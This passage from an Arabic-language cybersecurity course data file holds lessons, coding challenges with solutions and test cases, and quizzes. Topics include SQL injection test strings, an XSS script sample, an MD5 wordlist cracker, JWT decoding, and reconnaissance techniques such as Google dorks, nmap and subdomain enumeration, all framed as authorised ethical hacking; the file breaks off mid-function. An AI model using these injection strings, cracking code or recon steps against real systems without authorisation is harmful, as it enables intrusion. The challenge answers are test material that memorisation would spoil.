    print("=== اختبار SQL Injection ===")
    
    # محاولة هجوم
    malicious_username = "admin' OR '1'='1"
    malicious_password = "' OR '1'='1"
    
    # الضعيف (سينجح الهجوم)
    # result = login_vulnerable(malicious_username, malicious_password)
    
    # الآمن (سيفشل الهجوم)
    result = login_secure(malicious_username, malicious_password)
    
    print(f"نتيجة محاولة الاختراق: {'نجح ⚠️' if result else 'فشل ✅'}")`,
    language: 'python',
    xpReward: 200,
    order: 2,
    quiz: {
      question: 'ما هي الطريقة الأكثر أماناً للحماية من SQL Injection؟',
      options: [
        'String concatenation',
        'Parameterized queries / ORM',
        'Input filtering فقط',
        'Using LIMIT clause',
      ],
      correctAnswer: 1,
      explanation:
        'Parameterized Queries أو ORM تفصل البيانات عن الأوامر مما يمنع الحقن',
    },
  },
];

// ===== تحديات الأمن السيبراني الموسّعة =====
export const EXPANDED_CYBER_CHALLENGES: Challenge[] = [
  {
    id: 'cyber-ch-http-001',
    title: 'تحليل HTTP Request',
    description: 'استخرج المعلومات من HTTP request',
    difficulty: 'easy',
    points: 40,
    language: 'Python',
    icon: 'globe',
    category: 'cyber',
    starterCode: `def parse_http_request(request_text):
    """
    حلل HTTP request واستخرج:
    - Method (GET, POST, etc)
    - Path
    - Host
    - User-Agent
    
    Args:
        request_text: نص HTTP request
    
    Returns:
        dict مع المعلومات
    """
    # اكتب كودك هنا
    pass

# اختبار
request = """GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
"""

info = parse_http_request(request)
print(info)`,
    solution: `def parse_http_request(request_text):
    lines = request_text.strip().split('\\n')
    
    # السطر الأول: Method Path Version
    first_line = lines[0].split()
    method = first_line[0]
    path = first_line[1]
    
    # Headers
    headers = {}
    for line in lines[1:]:
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.strip()] = value.strip()
    
    return {
        'method': method,
        'path': path,
        'host': headers.get('Host'),
        'user_agent': headers.get('User-Agent')
    }`,
    hints: [
      'السطر الأول يحتوي Method و Path',
      'Headers بصيغة: Key: Value',
      'استخدم split() و strip()',
    ],
    testCases: [
      {
        input: 'parse_http_request("GET /index.html HTTP/1.1")["method"]',
        expectedOutput: 'GET',
        description: 'استخراج HTTP method',
      },
      {
        input: 'parse_http_request("POST /api/users HTTP/1.1")["method"]',
        expectedOutput: 'POST',
        description: 'استخراج method من POST request',
      },
    ],
    isLocked: false,
  },
  {
    id: 'cyber-ch-csrf-001',
    title: 'توليد CSRF Token',
    description: 'اكتب دالة لتوليد والتحقق من CSRF tokens',
    difficulty: 'medium',
    points: 60,
    language: 'Python',
    icon: 'shield-checkmark',
    category: 'cyber',
    starterCode: `import secrets
import hmac
import hashlib

def generate_csrf_token(secret_key, user_id):
    """
    ولّد CSRF token فريد للمستخدم
    
    Args:
        secret_key: مفتاح سري للتطبيق
        user_id: معرّف المستخدم
    
    Returns:
        token string
    """
    # اكتب كودك هنا
    pass

def verify_csrf_token(token, secret_key, user_id):
    """
    تحقق من صحة CSRF token
    
    Args:
        token: التوكن المُرسل
        secret_key: مفتاح سري للتطبيق
        user_id: معرّف المستخدم
    
    Returns:
        True/False
    """
    # اكتب كودك هنا
    pass

# اختبار
secret = "my_secret_key_123"
user = "user_456"

token = generate_csrf_token(secret, user)
print(f"Token: {token}")

is_valid = verify_csrf_token(token, secret, user)
print(f"Valid: {is_valid}")`,
    solution: `import secrets
import hmac
import hashlib

def generate_csrf_token(secret_key, user_id):
    """
    ولّد CSRF token فريد للمستخدم
    """
    # توليد random nonce
    nonce = secrets.token_hex(16)
    
    # إنشاء signature = HMAC(secret_key, user_id + nonce)
    message = f"{user_id}:{nonce}".encode()
    signature = hmac.new(
        secret_key.encode(),
        message,
        hashlib.sha256
    ).hexdigest()
    
    # Token = nonce:signature
    token = f"{nonce}:{signature}"
    return token

def verify_csrf_token(token, secret_key, user_id):
    """
    تحقق من صحة CSRF token
    """
    try:
        # فصل nonce و signature
        nonce, signature = token.split(':')
        
        # إعادة حساب signature
        message = f"{user_id}:{nonce}".encode()
        expected_signature = hmac.new(
            secret_key.encode(),
            message,
            hashlib.sha256
        ).hexdigest()
        
        # مقارنة آمنة
        return hmac.compare_digest(signature, expected_signature)
    except:
        return False`,
    hints: [
      'استخدم secrets.token_hex() للتوليد العشوائي',
      'استخدم HMAC للتوقيع',
      'دمج user_id في التوقيع',
      'استخدم hmac.compare_digest() للمقارنة الآمنة',
    ],
    testCases: [
      {
        input:
          'verify_csrf_token(generate_csrf_token("secret", "user123"), "secret", "user123")',
        expectedOutput: 'True',
        description: 'توليد وتحقق لنفس المستخدم',
      },
      {
        input:
          'verify_csrf_token(generate_csrf_token("secret", "user123"), "secret", "different_user")',
        expectedOutput: 'False',
        description: 'توكن لمستخدم مختلف يُرفض',
      },
      {
        input:
          'verify_csrf_token(generate_csrf_token("secret", "admin_user"), "secret", "admin_user")',
        expectedOutput: 'True',
        description: 'توليد وتحقق لمستخدم آخر',
      },
    ],
    isLocked: true,
  },
  {
    id: 'cyber-ch-hash-001',
    title: 'كسر تشفير MD5',
    description: 'اكتب برنامج لكسر هاش MD5 باستخدام Rainbow Table',
    difficulty: 'medium',
    points: 70,
    language: 'Python',
    icon: 'key',
    category: 'cyber',
    starterCode: `import hashlib

def crack_md5(target_hash, wordlist):
    """
    حاول كسر هاش MD5 باستخدام قائمة كلمات
    
    Args:
        target_hash: الهاش المراد كسره
        wordlist: قائمة بالكلمات المحتملة
    
    Returns:
        الكلمة الأصلية أو None
    """
    # اكتب كودك هنا
    pass

# اختبار
wordlist = ['password', '123456', 'admin', 'letmein', 'welcome', 'monkey', 'dragon']
target = '21232f297a57a5a743894a0e4a801fc3'  # admin

result = crack_md5(target, wordlist)
print(f"الكلمة: {result}")`,
    solution: `import hashlib

def crack_md5(target_hash, wordlist):
    """
    حاول كسر هاش MD5 باستخدام قائمة كلمات
    """
    for word in wordlist:
        # حساب هاش الكلمة
        word_hash = hashlib.md5(word.encode()).hexdigest()
        
        # مقارنة مع الهدف
        if word_hash == target_hash:
            return word
    
    return None

# اختبار
wordlist = ['password', '123456', 'admin', 'letmein', 'welcome']
target = '21232f297a57a5a743894a0e4a801fc3'  # admin

result = crack_md5(target, wordlist)
print(f"الكلمة: {result}")  # admin`,
    hints: [
      'استخدم hashlib.md5()',
      'حوّل الكلمة لـ bytes باستخدام .encode()',
      'استخدم .hexdigest() للحصول على الهاش',
      'قارن كل هاش مع الهدف',
    ],
    testCases: [
      {
        input:
          '"5f4dcc3b5aa765d61d8327deb882cf99", ["password", "admin", "123456"]',
        expectedOutput: 'password',
        description: 'كسر hash لكلمة password',
      },
      {
        input: '"abc123", ["test", "hello"]',
        expectedOutput: 'None',
        description: 'كلمة غير موجودة في القائمة',
      },
    ],
    isLocked: true,
  },
  {
    id: 'cyber-ch-xss-001',
    title: 'تنظيف مدخلات XSS',
    description: 'اكتب دالة لتنظيف المدخلات من سكريبتات XSS',
    difficulty: 'medium',
    points: 60,
    language: 'Python',
    icon: 'shield-checkmark',
    category: 'cyber',
    starterCode: `def sanitize_input(user_input):
    """
    تنظيف المدخلات من أكواد XSS
    
    يجب تحويل: < > " ' & إلى HTML entities
    
    Args:
        user_input: النص المدخل من المستخدم
    
    Returns:
        النص المنظف
    """
    # اكتب كودك هنا
    pass

# اختبار
malicious = '<script>alert("XSS")</script>'
safe = sanitize_input(malicious)
print(safe)  # يجب أن يكون آمناً للعرض`,
    solution: `def sanitize_input(user_input):
    """
    تنظيف المدخلات من أكواد XSS
    """
    if not user_input:
        return ""
    
    # تحويل الأحرف الخاصة
    replacements = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
    }
    
    result = user_input
    for char, entity in replacements.items():
        result = result.replace(char, entity)
    
    return result

# اختبار
malicious = '<script>alert("XSS")</script>'
safe = sanitize_input(malicious)
print(safe)  # &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;`,
    hints: [
      'استبدل < بـ &lt;',
      'استبدل > بـ &gt;',
      'استبدل " بـ &quot;',
      'الترتيب مهم! ابدأ بـ &',
    ],
    testCases: [
      {
        input: '"<script>"',
        expectedOutput: '&lt;script&gt;',
        description: 'تحويل وسوم script',
      },
      {
        input: '\'Hello "World"\'',
        expectedOutput: 'Hello &quot;World&quot;',
        description: 'تحويل علامات الاقتباس',
      },
    ],
    isLocked: true,
  },
];

// ===== تحديات أمنية إضافية =====
export const EXTRA_CYBER_CHALLENGES: Challenge[] = [
  {
    id: 'cyber-ch-base64-001',
    title: 'تشفير وفك Base64',
    description: 'اكتب دالتين لتشفير وفك تشفير Base64 بدون استخدام مكتبات',
    difficulty: 'easy',
    points: 20,
    language: 'Python',
    icon: 'lock-closed',
    starterCode: `def base64_encode(text):
    # شفّر النص إلى Base64
    pass`,
    solution: `def base64_encode(text):
    import base64
    return base64.b64encode(text.encode()).decode()`,
    hints: [
      'Base64 يحوّل كل 3 bytes إلى 4 أحرف',
      'يمكن استخدام مكتبة base64 المدمجة',
      'لا تنسى encode() و decode()',
    ],
    testCases: [
      {
        input: '"Hello"',
        expectedOutput: 'SGVsbG8=',
        description: 'تشفير Hello',
      },
      {
        input: '"Python"',
        expectedOutput: 'UHl0aG9u',
        description: 'تشفير Python',
      },
      { input: '"AB"', expectedOutput: 'QUI=', description: 'تشفير نص قصير' },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-vigenere-001',
    title: 'تشفير فيجنير (Vigenère)',
    description: 'اكتب دالة لتشفير نص باستخدام شفرة فيجنير',
    difficulty: 'medium',
    points: 35,
    language: 'Python',
    icon: 'lock-closed',
    starterCode: `def vigenere_encrypt(plaintext, key):
    # شفّر النص باستخدام مفتاح فيجنير
    # الأحرف الكبيرة فقط
    pass`,
    solution: `def vigenere_encrypt(plaintext, key):
    result = []
    key = key.upper()
    plaintext = plaintext.upper()
    key_idx = 0
    for char in plaintext:
        if char.isalpha():
            shift = ord(key[key_idx % len(key)]) - ord('A')
            encrypted = chr((ord(char) - ord('A') + shift) % 26 + ord('A'))
            result.append(encrypted)
            key_idx += 1
        else:
            result.append(char)
    return ''.join(result)`,
    hints: [
      'كل حرف يُشفَّر بإزاحة مختلفة حسب المفتاح',
      'الإزاحة = موقع حرف المفتاح في الأبجدية',
      'المفتاح يتكرر دورياً',
    ],
    testCases: [
      {
        input: '"HELLO", "KEY"',
        expectedOutput: 'RIJVS',
        description: 'تشفير HELLO بمفتاح KEY',
      },
      {
        input: '"ABC", "A"',
        expectedOutput: 'ABC',
        description: 'مفتاح A لا يغيّر',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-ipvalidator-001',
    title: 'التحقق من عنوان IP',
    description: 'اكتب دالة تتحقق من صحة عنوان IPv4',
    difficulty: 'easy',
    points: 20,
    language: 'Python',
    icon: 'globe',
    starterCode: `def is_valid_ipv4(ip):
    # تحقق من صحة عنوان IPv4
    # أرجع True أو False
    pass`,
    solution: `def is_valid_ipv4(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit():
            return False
        num = int(part)
        if num < 0 or num > 255:
            return False
        if len(part) > 1 and part[0] == '0':
            return False
    return True`,
    hints: [
      'عنوان IPv4 يتكون من 4 أجزاء مفصولة بنقاط',
      'كل جزء يجب أن يكون رقم بين 0-255',
      'لا تقبل الأصفار البادئة (مثل 01)',
    ],
    testCases: [
      {
        input: '"192.168.1.1"',
        expectedOutput: 'True',
        description: 'IP صالح',
      },
      {
        input: '"256.1.1.1"',
        expectedOutput: 'False',
        description: 'قيمة أكبر من 255',
      },
      { input: '"1.2.3"', expectedOutput: 'False', description: '3 أجزاء فقط' },
      {
        input: '"01.01.01.01"',
        expectedOutput: 'False',
        description: 'أصفار بادئة',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-urlparse-001',
    title: 'تحليل عنوان URL',
    description: 'اكتب دالة تستخرج أجزاء عنوان URL (بروتوكول، نطاق، مسار)',
    difficulty: 'medium',
    points: 30,
    language: 'Python',
    icon: 'link',
    starterCode: `def parse_url(url):
    # استخرج protocol, domain, path من URL
    # أرجع dict
    pass`,
    solution: `def parse_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    return {
        'protocol': parsed.scheme,
        'domain': parsed.netloc,
        'path': parsed.path or '/'
    }`,
    hints: [
      'يمكن استخدام urllib.parse.urlparse',
      'أو تحليل النص يدوياً بـ split',
      'البروتوكول قبل ://، النطاق بعده، المسار بعد /',
    ],
    testCases: [
      {
        input: 'parse_url("https://example.com/page")["protocol"]',
        expectedOutput: 'https',
        description: 'استخراج البروتوكول',
      },
      {
        input: 'parse_url("http://test.org")["protocol"]',
        expectedOutput: 'http',
        description: 'بروتوكول HTTP',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-emailval-001',
    title: 'التحقق من البريد الإلكتروني',
    description: 'اكتب دالة تتحقق من صحة عنوان بريد إلكتروني',
    difficulty: 'easy',
    points: 20,
    language: 'Python',
    icon: 'mail',
    starterCode: `def is_valid_email(email):
    # تحقق من صحة عنوان البريد
    # أرجع True أو False
    pass`,
    solution: `def is_valid_email(email):
    import re
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))`,
    hints: [
      'البريد يحتوي @ واحد فقط',
      'الجزء بعد @ يجب أن يحتوي نقطة واحدة على الأقل',
      'استخدم regex للتحقق من الصيغة',
    ],
    testCases: [
      {
        input: '"user@example.com"',
        expectedOutput: 'True',
        description: 'بريد صالح',
      },
      {
        input: '"invalid@"',
        expectedOutput: 'False',
        description: 'بدون نطاق',
      },
      {
        input: '"no-at-sign.com"',
        expectedOutput: 'False',
        description: 'بدون @',
      },
      {
        input: '"test@site.org"',
        expectedOutput: 'True',
        description: 'بريد صالح .org',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-hash-compare-001',
    title: 'مقارنة Hash آمنة',
    description: 'اكتب دالة تقارن كلمة مرور مع hash بشكل آمن (SHA-256)',
    difficulty: 'medium',
    points: 30,
    language: 'Python',
    icon: 'shield-checkmark',
    starterCode: `def hash_password(password):
    # أرجع SHA-256 hash للكلمة
    pass

def verify_password(password, hash_value):
    # تحقق إذا password يطابق hash_value
    pass`,
    solution: `def hash_password(password):
    import hashlib
    return hashlib.sha256(password.encode()).hexdigest()

def verify_password(password, hash_value):
    import hashlib
    return hashlib.sha256(password.encode()).hexdigest() == hash_value`,
    hints: [
      'استخدم hashlib.sha256() لحساب Hash',
      'لا تنسى encode() لتحويل النص إلى bytes',
      'hexdigest() يُرجع النتيجة كنص hex',
    ],
    testCases: [
      {
        input: '"hello"',
        expectedOutput:
          '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824',
        description: 'hash كلمة hello',
      },
      {
        input: '"test"',
        expectedOutput:
          '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
        description: 'hash كلمة test',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-jwt-decode-001',
    title: 'فك JWT Token',
    description: 'اكتب دالة تفك وتقرأ محتوى JWT Token (بدون التحقق من التوقيع)',
    difficulty: 'medium',
    points: 35,
    language: 'Python',
    icon: 'key',
    starterCode: `def decode_jwt(token):
    # فك JWT واستخرج payload
    # أرجع dict
    pass`,
    solution: `def decode_jwt(token):
    import base64
    import json
    parts = token.split('.')
    if len(parts) != 3:
        return None
    payload = parts[1]
    padding = 4 - len(payload) % 4
    if padding != 4:
        payload += '=' * padding
    decoded = base64.b64decode(payload).decode()
    return json.loads(decoded)`,
    hints: [
      'JWT يحتوي 3 أجزاء مفصولة بنقطة',
      'الجزء الثاني هو payload مُشفّر بـ Base64',
      'أضف padding (=) إذا لزم الأمر',
    ],
    testCases: [
      {
        input:
          'decode_jwt("eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.sig")["user"]',
        expectedOutput: 'admin',
        description: 'استخراج user من JWT',
      },
      {
        input:
          'decode_jwt("eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidGVzdCJ9.sig")["name"]',
        expectedOutput: 'test',
        description: 'استخراج name من JWT',
      },
      {
        input: 'decode_jwt("invalid.token")',
        expectedOutput: 'None',
        description: 'توكن غير صالح',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-bruteforce-001',
    title: 'كسر كلمة المرور بالقوة',
    description: 'اكتب دالة تولد كل التركيبات الممكنة لكلمة مرور بطول محدد',
    difficulty: 'hard',
    points: 50,
    language: 'Python',
    icon: 'hammer',
    starterCode: `def brute_force_count(charset, length):
    # احسب عدد التركيبات الممكنة
    # charset = مجموعة الحروف المتاحة
    # length = طول كلمة المرور
    pass`,
    solution: `def brute_force_count(charset, length):
    return len(charset) ** length`,
    hints: [
      'عدد التركيبات = عدد الحروف ^ الطول',
      'هذا يوضح أهمية طول كلمة المرور',
      'إضافة حرف واحد يضاعف التعقيد',
    ],
    testCases: [
      {
        input: '"abc", 2',
        expectedOutput: '9',
        description: '3 حروف، طول 2 = 9',
      },
      {
        input: '"ab", 3',
        expectedOutput: '8',
        description: '2 حروف، طول 3 = 8',
      },
      {
        input: '"abcdefghij", 4',
        expectedOutput: '10000',
        description: '10 حروف، طول 4',
      },
    ],
    isLocked: true,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-port-001',
    title: 'تحليل المنافذ (Ports)',
    description: 'اكتب دالة تحدد نوع الخدمة بناءً على رقم المنفذ',
    difficulty: 'easy',
    points: 15,
    language: 'Python',
    icon: 'server',
    starterCode: `def identify_port(port):
    # أرجع اسم الخدمة للمنفذ المعطى
    # أرجع "Unknown" إذا غير معروف
    pass`,
    solution: `def identify_port(port):
    services = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        443: "HTTPS",
        3306: "MySQL",
        5432: "PostgreSQL",
        27017: "MongoDB",
        6379: "Redis"
    }
    return services.get(port, "Unknown")`,
    hints: [
      'المنافذ المشهورة: 80=HTTP, 443=HTTPS, 22=SSH',
      'استخدم قاموس (dict) لربط المنفذ بالخدمة',
      'dict.get(key, default) تُرجع قيمة افتراضية',
    ],
    testCases: [
      { input: '80', expectedOutput: 'HTTP', description: 'منفذ HTTP' },
      { input: '443', expectedOutput: 'HTTPS', description: 'منفذ HTTPS' },
      { input: '22', expectedOutput: 'SSH', description: 'منفذ SSH' },
      {
        input: '9999',
        expectedOutput: 'Unknown',
        description: 'منفذ غير معروف',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
  {
    id: 'cyber-ch-xor-001',
    title: 'تشفير XOR',
    description: 'اكتب دالة لتشفير وفك تشفير النص باستخدام XOR',
    difficulty: 'medium',
    points: 30,
    language: 'Python',
    icon: 'lock-open',
    starterCode: `def xor_encrypt(text, key):
    # شفّر/فك النص باستخدام XOR مع المفتاح
    pass`,
    solution: `def xor_encrypt(text, key):
    result = []
    for i, char in enumerate(text):
        xored = ord(char) ^ ord(key[i % len(key)])
        result.append(chr(xored))
    return ''.join(result)`,
    hints: [
      'XOR: نفس العملية للتشفير والفك',
      'XOR كل حرف مع الحرف المقابل من المفتاح',
      'المفتاح يتكرر دورياً',
    ],
    testCases: [
      {
        input: '"abc", " "',
        expectedOutput: 'ABC',
        description: 'XOR مع مسافة يحوّل الحالة',
      },
      {
        input: '"ABC", " "',
        expectedOutput: 'abc',
        description: 'XOR عكسي يحوّل الحالة',
      },
      {
        input: '"A", "1"',
        expectedOutput: 'p',
        description: 'XOR حرف A مع 1 = p',
      },
    ],
    isLocked: false,
    category: 'cybersecurity',
  },
];

export const ALL_EXPANDED_CYBER_CHALLENGES: Challenge[] = [
  ...EXPANDED_CYBER_CHALLENGES,
  ...EXTRA_CYBER_CHALLENGES,
];

// ===== دروس الاختراق الأخلاقي =====
export const ETHICAL_HACKING_LESSONS: Lesson[] = [
  {
    id: 'ethical-intro',
    courseId: 'cyber-ethical-hacking',
    title: 'مقدمة في الاختراق الأخلاقي',
    description: 'ما هو الاختراق الأخلاقي والفرق بينه وبين الاختراق الضار',
    content: `
# الاختراق الأخلاقي (Ethical Hacking)

## ما هو الاختراق الأخلاقي؟
استخدام نفس أدوات وتقنيات المخترقين **بإذن قانوني** لاكتشاف الثغرات.

## الفرق بين القبعات

### 🎩 White Hat (القبعة البيضاء)
- مخترق أخلاقي
- يعمل بإذن قانوني
- يبلّغ عن الثغرات
- يحصل على مكافآت (Bug Bounty)

### 🖤 Black Hat (القبعة السوداء)
- مخترق ضار
- يعمل بشكل غير قانوني
- يستغل الثغرات للضرر
- يواجه السجن

### 🎩 Gray Hat (القبعة الرمادية)
- بين الاثنين
- قد يخترق بدون إذن
- لكن يبلّغ عن الثغرات

## القواعد الأساسية

### 1. احصل على إذن كتابي دائماً!
\`\`\`
📝 Scope of Work / Authorization Letter
- ما المسموح اختباره؟
- ما الممنوع؟
- الفترة الزمنية
- التوقيعات
\`\`\`

### 2. لا تُلحق ضرراً
- لا تحذف بيانات
- لا تُعطّل خدمات
- وثّق كل شيء

### 3. أبلغ عن كل ما تجده
- حتى الثغرات البسيطة
- لا تستغل أي شيء لنفسك

## مجالات العمل
- Penetration Tester
- Security Consultant
- Bug Bounty Hunter
- Red Team Member
- Security Researcher

## الشهادات المعتمدة
- CEH (Certified Ethical Hacker)
- OSCP (Offensive Security)
- CompTIA PenTest+
- eJPT (eLearnSecurity)
`,
    codeExample: `# مثال: كيف يفكر المخترق الأخلاقي

"""
سيناريو: فحص تطبيق ويب بإذن قانوني

الخطوات المنهجية:
1. الاستطلاع (Reconnaissance)
2. الفحص (Scanning)
3. الوصول (Gaining Access)
4. الحفاظ على الوصول (Maintaining Access)
5. تغطية الآثار (Covering Tracks) - في الاختبار الأخلاقي نوثّق بدلاً من التغطية
6. التقرير (Reporting)
"""

class EthicalHackingWorkflow:
    """
    سير عمل الاختراق الأخلاقي
    """
    
    def __init__(self, target, authorization):
        self.target = target
        self.authorization = authorization
        self.findings = []
        
        # التحقق من الإذن أولاً!
        if not self.verify_authorization():
            raise Exception("⚠️ لا يوجد إذن قانوني! توقف فوراً!")
    
    def verify_authorization(self):
        """التحقق من وجود إذن قانوني"""
        required_fields = [
            'client_name',
            'scope',
            'start_date',
            'end_date',
            'signature'
        ]
        
        for field in required_fields:
            if field not in self.authorization:
                print(f"❌ حقل مفقود: {field}")
                return False
        
        print("✅ الإذن القانوني صالح")
        return True
    
    def reconnaissance(self):
        """المرحلة 1: جمع المعلومات"""
        print("\\n🔍 مرحلة الاستطلاع...")
        
        info = {
            "domain": self.target,
            "ip_addresses": [],
            "subdomains": [],
            "technologies": [],
            "employees": []  # من LinkedIn مثلاً
        }
        
        # جمع معلومات عامة (Passive)
        print("  - جمع معلومات DNS")
        print("  - البحث في Google Dorks")
        print("  - فحص WHOIS")
        
        return info
    
    def scanning(self):
        """المرحلة 2: الفحص"""
        print("\\n📡 مرحلة الفحص...")
        
        # فحص المنافذ
        print("  - فحص المنافذ (nmap)")
        print("  - فحص الثغرات (Nessus/OpenVAS)")
        print("  - فحص تطبيق الويب (Burp Suite)")
        
        return {
            "open_ports": [80, 443, 22],
            "vulnerabilities": []
        }
    
    def add_finding(self, severity, title, description, recommendation):
        """إضافة ثغرة مكتشفة"""
        finding = {
            "id": len(self.findings) + 1,
            "severity": severity,  # Critical, High, Medium, Low
            "title": title,
            "description": description,
            "recommendation": recommendation
        }
        self.findings.append(finding)
        print(f"  🔴 ثغرة {severity}: {title}")
    
    def generate_report(self):
        """المرحلة الأخيرة: التقرير"""
        print("\\n📝 إنشاء التقرير...")
        
        report = f"""
╔══════════════════════════════════════╗
║     تقرير اختبار الاختراق           ║
╚══════════════════════════════════════╝

🎯 الهدف: {self.target}
📅 التاريخ: 2024-01-15
👤 المختبر: Security Team

📊 ملخص الثغرات:
"""
        
        severity_count = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
        for f in self.findings:
            severity_count[f["severity"]] += 1
        
        for sev, count in severity_count.items():
            report += f"  - {sev}: {count}\\n"
        
        report += "\\n📋 التفاصيل:\\n"
        for f in self.findings:
            report += f"""
[{f['severity']}] {f['title']}
  الوصف: {f['description']}
  التوصية: {f['recommendation']}
"""
        
        return report


# مثال على الاستخدام
authorization = {
    "client_name": "شركة Example",
    "scope": "example.com و جميع النطاقات الفرعية",
    "start_date": "2024-01-01",
    "end_date": "2024-01-31",
    "signature": "توقيع المدير التنفيذي"
}

try:
    pentest = EthicalHackingWorkflow("example.com", authorization)
    
    # تنفيذ المراحل
    pentest.reconnaissance()
    pentest.scanning()
    
    # إضافة ثغرات مكتشفة (مثال)
    pentest.add_finding(
        "High",
        "SQL Injection في صفحة تسجيل الدخول",
        "حقل username يقبل أوامر SQL",
        "استخدام Prepared Statements"
    )
    
    pentest.add_finding(
        "Medium",
        "Missing Security Headers",
        "لا يوجد Content-Security-Policy",
        "إضافة CSP headers"
    )
    
    # التقرير النهائي
    print(pentest.generate_report())
    
except Exception as e:
    print(f"❌ {e}")`,
    language: 'python',
    xpReward: 100,
    order: 1,
    quiz: {
      question: 'ما أول شيء يجب أن تفعله قبل اختبار الاختراق؟',
      options: [
        'فحص المنافذ',
        'الحصول على إذن قانوني كتابي',
        'تثبيت Kali Linux',
        'جمع المعلومات',
      ],
      correctAnswer: 1,
      explanation: 'الإذن القانوني أساسي! بدونه تصبح مخترقاً غير قانوني',
    },
  },
  {
    id: 'ethical-recon',
    courseId: 'cyber-ethical-hacking',
    title: 'الاستطلاع (Reconnaissance)',
    description: 'جمع المعلومات عن الهدف',
    content: `
# الاستطلاع - Reconnaissance

## ما هو الاستطلاع؟
جمع أكبر قدر من المعلومات عن الهدف قبل الهجوم.

## أنواع الاستطلاع

### Passive Reconnaissance
- **بدون** تفاعل مباشر مع الهدف
- لا يعرف الهدف أنك تبحث عنه
- آمن قانونياً

### Active Reconnaissance
- **تفاعل مباشر** مع الهدف
- يمكن اكتشافك
- يحتاج إذن

## أدوات Passive Recon

### 1. WHOIS
معلومات تسجيل النطاق
\`\`\`bash
whois example.com
\`\`\`

### 2. DNS Lookup
سجلات DNS
\`\`\`bash
nslookup example.com
dig example.com ANY
\`\`\`

### 3. Google Dorks
بحث متقدم في Google
\`\`\`
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com "password"
\`\`\`

### 4. Shodan
محرك بحث للأجهزة المتصلة
\`\`\`
shodan search hostname:example.com
\`\`\`

### 5. theHarvester
جمع الإيميلات والنطاقات الفرعية

### 6. Social Media
- LinkedIn: معلومات الموظفين
- Twitter: تسريبات
- GitHub: كود مكشوف

## أدوات Active Recon

### 1. Nmap
فحص المنافذ
\`\`\`bash
nmap -sV example.com
\`\`\`

### 2. Nikto
فحص ثغرات الويب

### 3. dirb/gobuster
اكتشاف الملفات والمجلدات المخفية

## ما نبحث عنه؟
- عناوين IP
- النطاقات الفرعية
- إيميلات الموظفين
- التقنيات المستخدمة
- المنافذ المفتوحة
- الثغرات المعروفة
`,
    codeExample: `# أدوات استطلاع بـ Python
import socket
import dns.resolver
import requests
import re

class ReconTools:
    """
    أدوات استطلاع للاختراق الأخلاقي
    ⚠️ استخدم فقط على أهداف مصرّح لك باختبارها!
    """
    
    def __init__(self, target):
        self.target = target
        self.results = {
            "ips": [],
            "subdomains": [],
            "emails": [],
            "technologies": [],
            "dns_records": {}
        }
    
    # ===== Passive Reconnaissance =====
    
    def dns_lookup(self):
        """استعلام DNS"""
        print(f"\\n🔍 DNS Lookup لـ {self.target}")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target, record_type)
                records = [str(r) for r in answers]
                self.results["dns_records"][record_type] = records
                print(f"  {record_type}: {records}")
            except:
                pass
        
        return self.results["dns_records"]
    
    def reverse_dns(self, ip):
        """Reverse DNS lookup"""
        try:
            hostname = socket.gethostbyaddr(ip)
            return hostname[0]
        except:
            return None
    
    def find_subdomains(self, wordlist=None):
        """اكتشاف النطاقات الفرعية"""
        print(f"\\n🔍 البحث عن نطاقات فرعية...")
        
        if wordlist is None:
            wordlist = [
                'www', 'mail', 'ftp', 'admin', 'blog',
                'api', 'dev', 'test', 'staging', 'app',
                'shop', 'store', 'portal', 'vpn', 'remote',
                'cdn', 'static', 'assets', 'media', 'img'
            ]
        
        found = []
        for sub in wordlist:
            subdomain = f"{sub}.{self.target}"
            try:
                socket.gethostbyname(subdomain)
                found.append(subdomain)
                print(f"  ✅ {subdomain}")
            except socket.gaierror:
                pass
        
        self.results["subdomains"] = found
        return found
    
    def extract_emails_from_text(self, text):
        """استخراج الإيميلات من نص"""
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'
        emails = re.findall(email_pattern, text)
        return list(set(emails))
    
    def check_robots_txt(self):
        """فحص ملف robots.txt"""
        print(f"\\n🔍 فحص robots.txt...")
        
        urls = [
            f"https://{self.target}/robots.txt",
            f"http://{self.target}/robots.txt"
        ]
        
        for url in urls:
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"  ✅ وُجد: {url}")
                    
                    # استخراج المسارات المخفية
                    disallowed = re.findall(r'Disallow: (.+)', response.text)
                    if disallowed:
                        print("  المسارات الممنوعة:")
                        for path in disallowed[:10]:
                            print(f"    - {path.strip()}")
                    
